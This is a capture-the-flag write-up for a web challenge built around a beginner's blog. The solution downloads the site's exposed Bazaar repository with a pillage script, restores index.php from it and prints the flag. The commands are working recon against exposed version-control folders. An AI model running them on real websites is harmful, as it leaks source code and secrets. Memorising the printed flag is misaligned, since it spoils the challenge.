# My First Blog
Web, 150 points

## Description:

A link to a website containing the following text was provided:

> #### My Blog 
> Just a spot for me to talk about how much I love Canonical 
> #### I love Canonical 
> As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I've tried out 
> * Juju - The worlds best configuration management tool! 
> * Bazaar- The worlds best version control! 
> * Ubuntu - The worlds best OS! 
> * Launchpad - GitHub? Gross! 
> 
> #### Learning PHP 
> recently learned about PHP and I can't stop switching everything over to it. In fact, this bldg is now powered by PHP, I think!! changed the file extension at least, and added a little PHP code below here. That should pretty much do it right? I have the PHP code commented out for now since I cant seem to get it to work right. I'll have to look into it later. 

## Solution:

This blog seems to be written by a beginner making his first steps in the development world. It's a classic beginner's mistake to upload source control files to the web, making them world-accessible. He is using Bazaar (which is similar to git) - and by trying to access known Bazaar files under "/.bzr" we are able to get a successful response.

Now we can use a script like [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage) to download the repository:

```console
~/utils/DVCS-Pillage/bzpillage.sh 138.247.13.106
```

We get the following directory structure:
```console
root@kali:/media/sf_CTFs/mitre/blog# tree -al 138.247.13.106/
138.247.13.106/
└── .bzr
    ├── branch
    │   ├── branch.conf
    │   ├── format
    │   ├── last-revision
    │   └── tags
    ├── branch-format
    ├── checkout
    │   ├── conflicts
    │   ├── dirstate
    │   ├── format
    │   ├── lock
    │   ├── merge-hashes
    │   └── views
    └── repository
        ├── format
        ├── indices
        │   ├── c325a543411b3717bd63b6cc879e3d50.cix
        │   ├── c325a543411b3717bd63b6cc879e3d50.iix
        │   ├── c325a543411b3717bd63b6cc879e3d50.rix
        │   └── c325a543411b3717bd63b6cc879e3d50.tix
        ├── pack-names
        └── packs
            └── c325a543411b3717bd63b6cc879e3d50.pack
```

Let's check out the revision log:
```console
root@kali:/media/sf_CTFs/mitre/blog/138.247.13.106# bzr log
------------------------------------------------------------
revno: 1
committer: BZR Lover
branch nick: filePathTraversalEasy
timestamp: Thu 2018-12-06 13:48:25 -0500
message:
  BZR is so cool!
```

Just one commit, let's take it:
```console
root@kali:/media/sf_CTFs/mitre/blog/138.247.13.106# bzr revert -r 1
  * index.php
```

What does `index.php` contain?
```console
root@kali:/media/sf_CTFs/mitre/blog/138.247.13.106# cat index.php | grep MCA
                // Flag is MCA{canonical_is_literally_my_favorite_company_in_the_whole_world}
```

